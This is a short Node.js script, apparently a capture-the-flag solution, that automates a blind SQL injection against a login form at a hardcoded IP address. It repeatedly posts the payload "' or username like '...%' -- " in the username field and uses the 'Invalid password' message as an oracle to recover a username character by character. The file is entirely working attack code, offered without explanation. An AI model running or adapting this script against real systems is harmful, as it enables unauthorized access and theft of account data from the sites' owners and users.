var request = require('request');	

var diccionarioLetras = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l","m", "n", "ñ", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]; //"%"

diccionarioMayus = [];

var diccionarioNum = ["0", "1", "2", "3", "4", "5", "6" , "7", "8", "9", "$", "-", ".", ",", "&", "/", "(", ")", "=","?","¿", "-", ";", ":", "¨", "*", "+", "{", "}",
					  "!", "¡" , "|", "º", "#", ">", "<"];

//var tildes = ["á", "é", "í", "ó", "ú"];
//.concat(tildes).concat(diccionarioMayus);

var diccionario = diccionarioLetras.concat(diccionarioNum);

const probardatos = async (password, caracter) => {

	var options = {
	  'method': 'POST',
	  'url': 'http://34.74.105.127/af9d34c402/login',
	  'headers': {
	    'Content-Type': 'application/x-www-form-urlencoded'
	  },
	  form : {
	    	'username': password,
		   	'password': "" //password
		}
	};

    return new Promise(function(resolve, reject){

    	request(options, function (error, response) {
			  if (error) throw new Error(error);
			  
			  if (response.body.toString().indexOf("Invalid password") !== -1) {
			  	
			  	console.log("Caracter encontrado: " + password) 
			  	resolve(true);

			  } else {
			 	console.log("NO ENCONTRADO")
			  	resolve(false);
			  } 
			  
			  
		});
    });
}; 

var resultado = "";

const tryAll = async () => {

	for (var j = 0; j < diccionario.length; j ++){

		var newPassword = "' or username like '" + resultado + diccionario[j] + "%' -- ";

		console.log(newPassword);

		await probardatos(newPassword).
		            then(function(res) {
 						
		              if ( res) {
		              	resultado = resultado + diccionario[j];
		              	j = -1;
		              	
		              }

		            }).catch(function(err) {
		              console.log(err);
		    });

	}
};

tryAll();